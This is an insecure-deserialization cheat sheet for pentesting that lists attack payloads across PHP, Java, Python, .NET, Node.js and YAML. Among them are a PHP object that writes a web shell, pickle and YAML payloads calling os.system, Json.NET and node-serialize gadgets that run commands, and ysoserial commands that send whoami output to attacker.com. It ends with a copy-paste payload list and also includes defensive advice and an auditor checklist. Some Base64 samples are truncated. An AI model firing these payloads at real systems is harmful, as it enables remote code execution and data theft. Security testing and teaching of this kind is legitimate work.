# INSECURE DESERIALIZATION PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS SERIALIZATION / DESERIALIZATION

| Concept | Explanation |
|---------|-------------|
| **Serialization** | Converting an in-memory object (with its properties and state) into a format that can be stored or transmitted (bytes, JSON, XML, etc.). |
| **Deserialization** | The reverse process: reconstructing the object from that format back into memory. |

**Why does it exist?** To save sessions, caches, communications between microservices, message queues, etc.

---

## 2. WHAT IS INSECURE DESERIALIZATION?

Occurs when an application deserializes **untrusted** data (attacker-controlled) without proper validation. The attacker can manipulate the serialized object to:

- Execute arbitrary code (RCE)
- Escalate privileges
- Perform path traversal attacks
- Cause DoS (Denial of Service)
- Manipulate business logic (e.g., change user role)

**Key fact:** This vulnerability is in the **OWASP Top 10** (#8 in 2021).

---

## 3. COMMON SERIALIZATION FORMATS

| Language/Format | Library/Function | Risk |
|-----------------|------------------|------|
| **PHP** | `serialize()` / `unserialize()` | **Very dangerous** - allows RCE via "POP Chains". |
| **Java** | `ObjectOutputStream` / `ObjectInputStream` | **Very dangerous** - gadget chains (Apache Commons, Spring, etc.). |
| **Python** | `pickle.dumps()` / `pickle.loads()` | **Very dangerous** - can execute code during `__reduce__`. |
| **Ruby** | `Marshal.dump()` / `Marshal.load()` | Dangerous - allows RCE. |
| **.NET** | `BinaryFormatter` / `Json.NET` | Dangerous - especially `BinaryFormatter` (deprecated for security). |
| **Node.js** | `JSON.parse()` / `JSON.stringify()` | **Low risk** (if only JSON) - but dangerous if used with `node-serialize` or similar. |
| **YAML** | `yaml.load()` (Python/Ruby) | Dangerous - can instantiate arbitrary objects. |

---

## 4. DETECTION PAYLOADS BY LANGUAGE

### PHP (unserialize)

**Basic detection payloads (generic):**
```
O:8:"stdClass":0:{}
O:4:"User":0:{}
O:4:"User":1:{s:4:"name";s:5:"admin";}
O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}
a:1:{i:0;s:5:"admin";}
s:5:"admin";
i:1;
b:1;
N;
```

**PHP object injection probes:**
```
O:8:"stdClass":1:{s:4:"test";s:5:"value";}
O:4:"User":1:{s:5:"admin";b:1;}
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
O:8:"stdClass":1:{s:8:"callback";s:6:"whoami";}
```

**Malformed payloads (to trigger errors):**
```
O:4:"User":0:{
O:4:"User":1:{s:4:"name";s:5:"admin";}
a:2:{s:4:"user";s:5:"admin";
O:9999999999:"NonExistent":0:{}
O:4:"User":1:{s:4:"name";N;}
```

**RCE via `__destruct` / `__wakeup` (conceptual):**
```
O:8:"FileCache":2:{s:8:"filename";s:10:"shell.php";s:7:"content";s:18:"<?php system($_GET['c']); ?>";}
O:8:"stdClass":1:{s:8:"callback";s:17:"system('whoami')";}
```

---

### Java (ObjectInputStream / ysoserial)

**Detection payloads (Base64 encoded):**
```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhShWWmM0AwAAeHB3DAAAAAI/QAAAAAAAAXcEAAAAAXB4
rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZSRJdGVyYXRvckNvbXBhcmF0b3IAAAAAAAAAAgIAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhz...
rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaE1hcJ0jcN4c0c0CAAJMAAhwYXR...
```

**Java serialized stream magic bytes (hex):**
```
AC ED 00 05
```

**Java serialized stream magic bytes (Base64 prefix):**
```
rO0AB
```

**Common ysoserial gadget probes (conceptual):**
```
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Spring1
Spring2
Groovy1
JRMPClient
Jdk7u21
URLDNS
```

**Command examples (for reference):**
```bash
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/$(whoami)"
java -jar ysoserial.jar URLDNS "http://attacker.com"
java -jar ysoserial.jar JRMPClient "attacker.com:1099"
```

---

### Python (pickle / PyYAML)

**Pickle detection payloads (Base64 encoded):**
```
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAR3aG9hbWmUhZRSlC4=
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARscyAtYZSFI2U=
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARpZJSFlFKULg==
```

**Pickle detection payloads (raw):**
```
cos
system
(S'whoami'
tR.
```

**Malformed pickle probes:**
```
\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00
\x80\x05\x95\x00\x00\x00\x00\x00\x00\x00\x00
```

**PyYAML detection payloads:**
```
!!python/object/apply:os.system ["whoami"]
!!python/object/apply:subprocess.check_output ["id"]
!!python/object/apply:eval ["1+1"]
!!python/object/new:os.system ["whoami"]
!!python/name:os.system
!!python/object/apply:builtins.eval ["__import__('os').system('whoami')"]
```

**Ruby YAML detection payloads:**
```
!ruby/object:OpenStruct
  table:
    :command: "whoami"
!ruby/object:Gem::Requirement
!ruby/object:Gem::Installer
```

---

### .NET (BinaryFormatter / ViewState / Json.NET)

**BinaryFormatter magic bytes (hex):**
```
00 01 00 00 00 FF FF FF FF
```

**Base64 prefix:**
```
AAEAAAD/////
```

**ViewState detection payloads:**
```
/wEPDwUJODU0Njc1MDYyZGQm/vY9l5qS8C5gZgZy8LmW1XKv5Q==
/wEPDwUKMTIzNDU2Nzg5ZGQ=
/wEPDwUKMTIzNDU2Nzg5MA8UKwACZBAVDg==
```

**Json.NET TypeNameHandling probes (JSON):**
```
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c whoami"]}}
{"$type":"System.Diagnostics.Process, System.Diagnostics.Process","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo","FileName":"cmd","Arguments":"/c whoami"}}
```

**ysoserial.net gadget probes (conceptual):**
```
TypeConfuseDelegate
ActivitySurrogateSelector
ObjectDataProvider
WindowsIdentity
PSObject
TextFormattingRunProperties
```

---

### Node.js (node-serialize / JSON)

**node-serialize detection payloads:**
```
{"rce":"_$$ND_FUNC$$_function(){ return 1; }()"}
{"test":"_$$ND_FUNC$$_function(){ require('child_process').exec('whoami'); }()"}
{"payload":"_$$ND_FUNC$$_function(){ process.exit(1); }()"}
```

**Generic JSON deserialization probes:**
```
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"admin":true}}
```

---

## 5. COOKIE / HEADER DETECTION

If you find serialized data in cookies, parameters, or headers, identify the format:

| Prefix | Format |
|--------|--------|
| `O:4:"User":...` | PHP |
| `a:2:{...}` | PHP array |
| `s:5:"admin";` | PHP string |
| `rO0AB...` (Base64) | Java |
| `AC ED 00 05` (hex) | Java |
| `gASV...` (Base64) | Python Pickle |
| `cos\nsystem\n...` | Python Pickle (raw) |
| `AAEAAAD/////` (Base64) | .NET BinaryFormatter |
| `{"$type":...}` | .NET Json.NET |
| `_$$ND_FUNC$$_` | Node.js node-serialize |
| `!!python/object/...` | YAML (Python) |
| `!ruby/object:...` | YAML (Ruby) |

**Header names commonly carrying serialized data:**
```
Cookie
Set-Cookie
X-Object
X-Serialized
X-Java-Serialized
X-PHP-Object
X-DotNet-ViewState
X-BinaryFormatter
X-Data
X-Payload
Content-Type: application/x-java-serialized-object
```

---

## 6. HOW TO DETECT THIS VULNERABILITY

| Method | Detail |
|--------|--------|
| **1. Look for dangerous functions** | `unserialize()`, `ObjectInputStream`, `pickle.loads`, `YAML.load`, `BinaryFormatter` |
| **2. Fuzzing with special characters** | Send corrupted serialized data and watch for errors (stack traces). |
| **3. Check headers** | `Content-Type: application/x-java-serialized-object`, `X-Object`, `Cookie` with binary data. |
| **4. Burp Suite Extensions** | Use **Java Deserialization Scanner** or **ysoserial** integrated. |
| **5. Library analysis** | Look for vulnerable versions of Commons Collections, Spring, etc. |
| **6. Automated tools** | `GadgetProbe`, `SerialKiller`, `DeserLab`. |

---

## 7. WHAT TO DO IF YOU FIND A SERIALIZED COOKIE

1. **Identify the format:**
   - Starts with `O:4:"User":...` → PHP
   - Binary and starts with `rO0AB` (Base64) → Java
   - Looks like JSON with strange characters → Pickle (Python)

2. **Decode/Deserialize locally** (without executing malicious code) to inspect the structure.

3. **Modify values** (e.g., change `"admin":false` to `true`).

4. **Resend and verify changes in the response.**

---

## 8. DEFENSE / BEST PRACTICES

| Rule | Explanation |
|------|-------------|
| **1. NEVER deserialize untrusted data** | If the data comes from the user, don't deserialize it. Use simple, sanitized JSON. |
| **2. Use safe formats** | Prefer JSON or XML (with schema validation) over binary. |
| **3. Digital signatures (HMAC)** | Sign serialized objects with a secret key and verify before deserializing. |
| **4. Type validation (whitelist)** | In Java: use `ObjectInputFilter` (since Java 9). |
| **5. PHP: `allowed_classes`** | In `unserialize()`, use the second parameter to allow only specific classes. |
| **6. Python: `yaml.safe_load()`** | Instead of `yaml.load()`. |
| **7. Java: Disable RMI** | If you don't use it, disable remote deserialization. |
| **8. Keep libraries updated** | Apache Commons Collections > 3.2.2 patches known gadgets. |
| **9. Monitoring and WAF** | Detect payloads from known tools (ysoserial, PHPGGC). |

---

## 9. SECURE VS INSECURE CODE EXAMPLES

### PHP

| Insecure | Secure |
|----------|--------|
| `$user = unserialize($_COOKIE['data']);` | `$user = unserialize($_COOKIE['data'], ['allowed_classes' => ['User']]);` |
| | + Sign with HMAC: `if (hash_hmac('sha256', $data, $secret) !== $_COOKIE['sig']) die();` |

### Python

| Insecure | Secure |
|----------|--------|
| `obj = pickle.loads(data)` | **Alternative:** Use JSON with validation. |
| `obj = yaml.load(data)` | `obj = yaml.safe_load(data)` |

### Java

| Insecure | Secure (Java 9+) |
|----------|------------------|
| `ObjectInputStream ois = new ObjectInputStream(input);` | `ObjectInputStream ois = new ObjectInputStream(input);` <br> `ois.setObjectInputFilter(filter);` |

**Example filter:**
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxbytes=1024;com.mycompany.*;!*"
);
```

### Node.js

| Insecure | Secure |
|----------|--------|
| `serialize.unserialize(data)` | Use `JSON.parse()` and validate schema with `Joi` or `Ajv`. |

---

## 10. ATTACK SCENARIOS (REAL CASES)

| Case | Explanation |
|------|-------------|
| **1. Java session cookie** | Cookie with Base64 serialized data. Change object to be administrator. |
| **2. POST parameter in REST API** | API receives `data` in JSON containing a Python serialized object. |
| **3. Uploaded files** | Upload a `.ser` or `.pickle` file that the server processes automatically. |
| **4. Message queues (RabbitMQ, Kafka)** | If the message contains serialized objects and the app processes them without validation. |
| **5. RMI (Remote Method Invocation) in Java** | RMI ports open that accept remote objects. |

---

## 11. USEFUL COMMANDS FOR PENTESTING

```bash
# Generate Java payload (ysoserial)
java -jar ysoserial.jar CommonsCollections5 "curl attacker.com/$(whoami)" > payload.ser
# Convert to base64 for sending
base64 -w0 payload.ser

# Generate PHP payload (PHPGGC)
phpggc Monolog/RCE1 system "id" --json

# Decode Java serialized object (for inspection)
java -cp serializr.jar Serializr decode payload.ser

# Test deserialization in Python
python3 -c "import pickle, base64, os; print(base64.b64encode(pickle.dumps(os.system('whoami'))))"
```

---

## 12. VISUAL ATTACK SUMMARY

```
[Attacker]
    ↓ Creates malicious object
    ↓ Serializes with gadget chain
    ↓ Encodes (base64/binary)
    ↓ Sends in Cookie/Input
[Server]
    ↓ Receives data
    ↓ DESERIALIZES without validation
    ↓ POP! Executes __destruct, __wakeup, __reduce, readObject
    ↓ RCE / Escalation / DoS
```

---

## 13. CHECKLIST FOR SECURITY AUDITORS

- [ ] Does the application use native serialization (PHP, Java, Python, Ruby)?
- [ ] Do serialized data travel over the network or get stored?
- [ ] Can the user modify that data (cookies, parameters, headers)?
- [ ] Are allowed classes validated before deserializing?
- [ ] Is HMAC signing used for integrity?
- [ ] Are there known vulnerable libraries (Commons Collections, etc.)?
- [ ] Does the server show stack traces if deserialization fails?

---

## 14. GOLDEN RULE

> *"If you deserialize data the user can touch, it's like giving them the keys to your house and trusting they won't do anything bad. The only safe way to serialize is: **don't serialize untrusted data**, or **sign and validate everything**."*

**Bonus:** If you work with Java, **avoid `ObjectInputStream` at all costs**. If unavoidable, use `ObjectInputFilter` and update all libraries. If you work with PHP, configure `allowed_classes` and never use `unserialize()` on cookie data without HMAC.

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
O:8:"stdClass":0:{}
O:4:"User":0:{}
O:4:"User":1:{s:4:"name";s:5:"admin";}
O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}
a:1:{i:0;s:5:"admin";}
s:5:"admin";
i:1;
b:1;
N;
O:8:"stdClass":1:{s:4:"test";s:5:"value";}
O:4:"User":1:{s:5:"admin";b:1;}
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
O:8:"stdClass":1:{s:8:"callback";s:6:"whoami";}
O:4:"User":0:{
O:4:"User":1:{s:4:"name";s:5:"admin";}
a:2:{s:4:"user";s:5:"admin";
O:9999999999:"NonExistent":0:{}
O:4:"User":1:{s:4:"name";N;}
O:8:"FileCache":2:{s:8:"filename";s:10:"shell.php";s:7:"content";s:18:"<?php system($_GET['c']); ?>";}
O:8:"stdClass":1:{s:8:"callback";s:17:"system('whoami')";}
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhShWWmM0AwAAeHB3DAAAAAI/QAAAAAAAAXcEAAAAAXB4
rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZSRJdGVyYXRvckNvbXBhcmF0b3IAAAAAAAAAAgIAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhz...
rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaE1hcJ0jcN4c0c0CAAJMAAhwYXR...
rO0AB
ACED0005
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Spring1
Spring2
Groovy1
JRMPClient
Jdk7u21
URLDNS
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAR3aG9hbWmUhZRSlC4=
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARscyAtYZSFI2U=
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARpZJSFlFKULg==
cos
system
(S'whoami'
tR.
\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00
\x80\x05\x95\x00\x00\x00\x00\x00\x00\x00\x00
!!python/object/apply:os.system ["whoami"]
!!python/object/apply:subprocess.check_output ["id"]
!!python/object/apply:eval ["1+1"]
!!python/object/new:os.system ["whoami"]
!!python/name:os.system
!!python/object/apply:builtins.eval ["__import__('os').system('whoami')"]
!ruby/object:OpenStruct
!ruby/object:Gem::Requirement
!ruby/object:Gem::Installer
AAEAAAD/////
/wEPDwUJODU0Njc1MDYyZGQm/vY9l5qS8C5gZgZy8LmW1XKv5Q==
/wEPDwUKMTIzNDU2Nzg5ZGQ=
/wEPDwUKMTIzNDU2Nzg5MA8UKwACZBAVDg==
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c whoami"]}}
{"$type":"System.Diagnostics.Process, System.Diagnostics.Process","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo","FileName":"cmd","Arguments":"/c whoami"}}
TypeConfuseDelegate
ActivitySurrogateSelector
ObjectDataProvider
WindowsIdentity
PSObject
TextFormattingRunProperties
{"rce":"_$$ND_FUNC$$_function(){ return 1; }()"}
{"test":"_$$ND_FUNC$$_function(){ require('child_process').exec('whoami'); }()"}
{"payload":"_$$ND_FUNC$$_function(){ process.exit(1); }()"}
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"admin":true}}
O:4:"User":...
a:2:{...}
s:5:"admin";
rO0AB...
gASV...
cos\nsystem\n...
AAEAAAD/////
{"$type":...
_$$ND_FUNC$$_
!!python/object/...
!ruby/object:...
Cookie
Set-Cookie
X-Object
X-Serialized
X-Java-Serialized
X-PHP-Object
X-DotNet-ViewState
X-BinaryFormatter
X-Data
X-Payload
Content-Type: application/x-java-serialized-object
java -jar ysoserial.jar CommonsCollections5 "curl attacker.com/$(whoami)" > payload.ser
base64 -w0 payload.ser
phpggc Monolog/RCE1 system "id" --json
python3 -c "import pickle, base64, os; print(base64.b64encode(pickle.dumps(os.system('whoami'))))"
```
